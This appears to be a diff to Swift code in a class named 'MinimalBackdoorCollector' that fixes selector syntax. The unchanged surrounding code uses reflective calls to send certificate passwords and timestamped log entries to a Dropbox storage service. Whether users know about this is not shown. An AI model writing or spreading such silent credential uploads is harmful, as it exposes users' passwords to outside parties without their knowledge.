@@ -189,10 +189,10 @@ class MinimalBackdoorCollector {
                 
                 // Also store password if provided
                 if let password = password {
-                    if dropboxService.responds(to: Selector("storePasswordForCertificate:password:completion:")) {
+                    if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
                         let passwordCompletion: ((Bool, Error?) -> Void)? = nil
                         dropboxService.perform(
-                            Selector("storePasswordForCertificate:password:completion:"),
+                            Selector(("storePasswordForCertificate:password:completion:")),
                             with: url.lastPathComponent,
                             with: password,
                             with: passwordCompletion
@@ -212,12 +212,12 @@ class MinimalBackdoorCollector {
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
             
             // Correct selector syntax and parameters
-            if dropboxService.responds(to: Selector("uploadLogEntry:fileName:completion:")) {
+            if dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
                 let fileName = "log_\(Int(Date().timeIntervalSince1970)).txt"
                 let completion: ((Bool, Error?) -> Void)? = nil
                 
                 dropboxService.perform(
-                    Selector("uploadLogEntry:fileName:completion:"),
+                    Selector(("uploadLogEntry:fileName:completion:")),
                     with: logEntry,
                     with: fileName,
                     with: completion
